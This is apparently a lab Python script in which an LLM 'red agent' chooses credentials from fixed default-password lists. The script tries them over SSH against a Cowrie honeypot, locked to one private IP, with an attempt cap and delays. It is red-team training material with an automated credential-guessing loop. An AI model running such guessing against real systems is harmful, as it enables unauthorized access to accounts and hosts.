import json
import time

import paramiko
from dotenv import load_dotenv
from openai import OpenAI

load_dotenv()
client = OpenAI()

TARGET_HOST = "192.168.8.121"
TARGET_PORT = 2222
MAX_ATTEMPTS = 5
ATTEMPT_DELAY = 8

USERNAMES = [
    "admin",
    "administrator",
    "labadmin",
    "root",
]

PASSWORDS = [
    "password",
    "password123",
    "admin123",
    "BlueTeam!2026",
]

history = []


def validate_target():
    if TARGET_HOST != "192.168.8.121":
        raise RuntimeError(
            "Safety boundary violation: "
            "unexpected target host"
        )

    if TARGET_PORT != 2222:
        raise RuntimeError(
            "Safety boundary violation: "
            "only Cowrie port 2222 is allowed"
        )


def clean_json(text):
    text = text.strip()

    if text.startswith("```"):
        text = (
            text.replace("```json", "")
            .replace("```", "")
            .strip()
        )

    return json.loads(text)


def choose_credentials():
    prompt = f"""
You are the reasoning component of a red-team agent operating
inside an authorized private cybersecurity lab.

The target is a Cowrie SSH honeypot.
Your goal is to test credential security while minimizing attempts.

Allowed usernames:
{USERNAMES}

Allowed passwords:
{PASSWORDS}

Previous results:
{history}

Choose one username and password combination that has not
already been attempted.

Return only valid JSON:
{{
  "username": "value",
  "password": "value",
  "reason": "short explanation"
}}
"""

    response = client.responses.create(
        model="gpt-5.6-luna",
        input=prompt,
        reasoning={"effort": "low"},
    )

    decision = clean_json(response.output_text)

    if decision["username"] not in USERNAMES:
        raise ValueError(
            "Agent selected a disallowed username"
        )

    if decision["password"] not in PASSWORDS:
        raise ValueError(
            "Agent selected a disallowed password"
        )

    attempted_pair = (
        decision["username"],
        decision["password"],
    )

    prior_pairs = {
        (item["username"], item["password"])
        for item in history
    }

    if attempted_pair in prior_pairs:
        raise ValueError(
            "Agent repeated a previous attempt"
        )

    return decision


def attempt_ssh(decision):
    validate_target()

    ssh = paramiko.SSHClient()

    # Cowrie uses a disposable host key inside this isolated lab.
    ssh.set_missing_host_key_policy(
        paramiko.AutoAddPolicy()
    )

    try:
        ssh.connect(
            hostname=TARGET_HOST,
            port=TARGET_PORT,
            username=decision["username"],
            password=decision["password"],
            timeout=5,
            auth_timeout=5,
            banner_timeout=5,
            allow_agent=False,
            look_for_keys=False,
        )

        return "success", "SSH authentication accepted"

    except paramiko.AuthenticationException:
        return "failed", "SSH authentication rejected"

    except (
        paramiko.SSHException,
        TimeoutError,
        OSError,
    ) as error:
        return "connection_error", str(error)

    finally:
        ssh.close()


print("\nCOWRIE RED AGENT STARTED")
print(
    f"Locked target: "
    f"{TARGET_HOST}:{TARGET_PORT}"
)
print(f"Maximum attempts: {MAX_ATTEMPTS}\n")

for attempt_number in range(
    1,
    MAX_ATTEMPTS + 1,
):
    decision = choose_credentials()

    print(f"Attempt {attempt_number}")
    print(f"Reasoning: {decision['reason']}")
    print(
        f"Selected username: "
        f"{decision['username']}"
    )
    print("Selected password: [hidden]")

    result, message = attempt_ssh(decision)

    print(f"Result: {result.upper()}")
    print(f"Message: {message}\n")

    history.append(
        {
            "username": decision["username"],
            "password": decision["password"],
            "result": result,
        }
    )

    if result == "success":
        print(
            "RED AGENT achieved initial access "
            "to the Cowrie fake shell."
        )
        break

    if result == "connection_error":
        print(
            "RED AGENT stopped because the "
            "Cowrie service was unreachable."
        )
        break

    time.sleep(ATTEMPT_DELAY)

else:
    print(
        "RED AGENT stopped after reaching "
        "its attempt limit."
    )
